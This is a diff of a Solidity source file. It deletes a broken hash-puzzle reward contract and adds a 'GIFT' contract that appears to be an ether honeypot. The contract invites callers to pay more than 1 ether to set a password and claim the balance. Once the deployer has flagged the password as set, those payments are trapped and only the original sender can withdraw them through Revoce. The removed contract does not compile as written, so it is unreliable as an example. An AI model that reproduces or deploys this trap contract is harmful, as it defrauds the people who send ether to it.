@@ -1,30 +1,38 @@
 pragma solidity ^0.5.1;
 
-contract SolveTheHash
-{
-  address public owner;
-  bool public solved;
-  uint public reward;
-  bytes32 public diff;
-  bytes public solution;
-  constructor()
-  {
-    owner = msg.sender;
-    reward = msg.value;
-    solved = false;
-    diff = bytes32(11111); // Сложность
-  }
-  function()
-  {
-    if (msg.data.length > 0)
-    { // Отправка решения
-      if (locked) throw;
-      if (sha256(msg.data) < diff)
-      {
-        msg.sender.send(reward); // Отправка вознаграждения
-        solution = msg.data;
-        solved = true;
-      }
+contract GIFT {
+    bool passHasBeenSet = false;
+    address sender;
+    bytes32 public hashPass;
+
+    function () public payable {}
+
+    function GetHash(bytes pass) public constant returns(bytes32) {
+        return sha3(pass);
     }
-  }
+
+    function SetPass(bytes32 hash)  public payable {
+        if ((!passHasBeenSet && (msg.value > 1 ether)) || hashPass == 0x0) {
+            hashPass = hash;
+            sender = msg.sender;
+        }
+    }
+
+    function GetGift(bytes pass) external payable {
+        if (hashPass == sha3(pass)) {
+            msg.sender.transfer(this.balance);
+        }
+    }
+
+    function Revoce() public payable {
+        if (msg.sender == sender) {
+            sender.transfer(this.balance);
+        }
+    }
+
+    function PassHasBeenSet(bytes32 hash) public {
+        if (msg.sender == sender && hash == hashPass) {
+            passHasBeenSet = true;
+        }
+    }
 }
